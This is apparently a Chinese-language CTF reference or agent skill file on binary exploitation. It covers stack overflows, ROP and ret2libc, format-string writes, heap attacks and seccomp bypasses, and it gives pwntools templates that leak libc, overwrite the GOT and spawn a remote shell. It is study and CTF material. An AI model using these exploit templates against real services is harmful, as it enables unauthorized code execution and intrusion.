---
name: ctf-pwn
description: 二进制利用：栈溢出、堆、格式化字符串、ROP
category: pwn
---

## 特征识别
- 给了ELF + 远程地址(nc host port)，题目有"pwn"/"exploit"/"shell"
- `checksec <binary>` 看保护：NX/Canary/PIE/RELRO

## 保护机制速查
```
checksec --file=binary
# RELRO: Partial→GOT可写 / Full→GOT只读(不能改GOT)
# Canary: 有→需泄露或绕过(fork服务器可逐字节爆破)
# NX: 有→不能执行栈上shellcode，必须用ROP
# PIE: 有→地址随机化，需先泄露基址
```

## 工具
`checksec` `gdb`+`pwndbg` `pwntools` `ROPgadget` `one_gadget` `ropper`

## 解题步骤
1. `checksec <binary>` — 确认保护机制
2. `file <binary>` + 反编译找漏洞函数（gets/scanf/sprintf/read无边界检查）
3. 确定漏洞类型后走对应路线：

### 栈溢出（无Canary）
4. `python3 -c "from pwn import *; print(cyclic(200))"` | `./binary` 找offset
5. 无NX：`jmp esp` gadget + shellcode
6. 有NX：ROP链 → `ROPgadget --binary <binary> --ropchain`
7. 有PIE：先leak地址（puts@got），再算基址

### 栈溢出ROP模板（有NX无PIE）
```python
from pwn import *
elf = ELF('./binary')
libc = ELF('./libc.so.6')
r = remote('target', port)
# 1. 泄露libc: puts(puts@got) → ret main
pop_rdi = next(elf.search(asm('pop rdi; ret')))
payload = b'A'*offset + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
r.sendline(payload)
leak = u64(r.recvline()[:6].ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
# 2. ret2system
ret = next(elf.search(asm('ret')))  # 栈对齐
payload2 = b'A'*offset + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
r.sendline(payload2)
r.interactive()
```

### ret2libc / ret2syscall
- ret2libc: 泄露libc基址 → system("/bin/sh") 或 one_gadget
- ret2syscall: `ROPgadget --binary <binary> | grep "syscall"` → 构造execve("/bin/sh",0,0)
- `one_gadget libc.so.6` 找一键getshell地址（受寄存器约束）

### 格式化字符串
4. 输入`%p.%p.%p.%p`确认漏洞，数偏移
5. 任意读：`%{offset}$s`读GOT表泄露libc
6. 任意写：`fmtstr_payload(offset, {target: value})`

### 格式化字符串详细
```python
from pwn import *
# 自动化写任意地址
def send_payload(p): r.sendline(p); return r.recvline()
fmt = FmtStr(send_payload)
fmt.write(elf.got['printf'], libc.sym['system'])
fmt.execute_writes()
# 手工：%Nc%M$hn 向第M个参数指向的地址写N（2字节）
# 手工：%M$s 读第M个参数指向的地址的字符串
```

### 堆利用
4. 识别分配器(ptmalloc/jemalloc)和libc版本
5. UAF/double-free/堆溢出 → tcache poisoning / fastbin attack
6. 目标：覆写`__free_hook`或`__malloc_hook`为system/one_gadget

### 堆利用Checklist
- **Use-After-Free**: free后指针未清零 → 重新分配同大小chunk → 控制已释放结构的fd/bk
- **Double Free**: free同一块两次 → tcache poisoning(glibc 2.27+) → 任意地址分配
  - glibc 2.32+有safe-linking: `fd = (addr >> 12) ^ target` 需泄露堆地址
- **Heap Overflow**: 溢出修改相邻chunk的size/fd → unlink attack / overlapping chunks
- **Tcache**: glibc 2.26+ 默认7个bins，FIFO，无完整性检查(2.32前) → 最简单的任意写
- **Fastbin**: 分配<0x80字节chunk → fastbin dup → 伪造chunk在`__malloc_hook`附近
- libc 2.34+ 移除了`__free_hook/__malloc_hook` → 改FSOP/house of系列

## Flag位置
- 拿到shell后：`cat /flag*` `cat /home/*/flag*` `env | grep FLAG`

## 常用one_gadget/ROP速查
```python
# one_gadget自动搜索
# one_gadget /path/to/libc.so.6

# pwntools ROP模板
from pwn import *
elf = ELF('./vuln')
libc = ELF('./libc.so.6')
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])  # 泄露libc
rop.call(elf.symbols['main'])        # 返回main重新利用
```

## seccomp/沙箱
- `seccomp-tools dump ./binary` 查看沙箱规则
- 禁execve → ORW(open/read/write)链读flag
- 禁write → sendfile/mmap+侧信道
